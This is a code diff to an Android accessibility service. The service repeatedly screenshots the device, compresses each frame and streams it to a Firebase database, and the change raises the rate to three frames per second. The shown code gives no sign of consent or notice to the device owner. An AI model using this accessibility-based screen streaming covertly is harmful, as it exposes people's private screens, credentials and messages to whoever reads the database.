@@ -28,8 +28,10 @@ public class MyAccessibilityService extends AccessibilityService {
     private Path swipePath;
     private long swipeStartTime = 0;
     private long lastTouchTime = 0;
+    
+    // Smart Frame Dropping Flags
     private boolean isTakingScreenshot = false;
-    private android.os.Handler screenshotHandler;
+    private boolean isUploading = false;
 
     @Override
     public void onServiceConnected() {
@@ -43,11 +45,11 @@ public class MyAccessibilityService extends AccessibilityService {
     }
 
     private void startScreenshotLoop() {
-        screenshotHandler = new android.os.Handler(android.os.Looper.getMainLooper());
-        screenshotHandler.post(new Runnable() {
+        android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
+        handler.post(new Runnable() {
             @Override
             public void run() {
-                if (!isTakingScreenshot && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                if (!isTakingScreenshot && !isUploading && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                     isTakingScreenshot = true;
                     takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                         @Override
@@ -57,7 +59,7 @@ public class MyAccessibilityService extends AccessibilityService {
                             if (bitmap != null) {
                                 Bitmap scaled = Bitmap.createScaledBitmap(bitmap, 270, 480, false);
                                 ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                                scaled.compress(Bitmap.CompressFormat.JPEG, 20, baos);
+                                scaled.compress(Bitmap.CompressFormat.JPEG, 10, baos); // 10% Quality for super fast upload
                                 String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
 
                                 Map<String, Object> frameData = new HashMap<>();
@@ -65,17 +67,23 @@ public class MyAccessibilityService extends AccessibilityService {
                                 frameData.put("width", 270);
                                 frameData.put("height", 480);
                                 frameData.put("timestamp", System.currentTimeMillis());
-                                screenRef.setValue(frameData);
+                                
+                                isUploading = true;
+                                screenRef.setValue(frameData).addOnCompleteListener(task -> {
+                                    isUploading = false;
+                                });
 
                                 bitmap.recycle();
                                 scaled.recycle();
                             }
                             isTakingScreenshot = false;
                         }
-                        @Override public void onFailure(int errorCode) { isTakingScreenshot = false; }
+                        @Override public void onFailure(int errorCode) { 
+                            isTakingScreenshot = false; 
+                        }
                     });
                 }
-                screenshotHandler.postDelayed(this, 800); // 1.25 FPS (Safe for Firebase)
+                handler.postDelayed(this, 300); // Target 3 FPS
             }
         });
     }
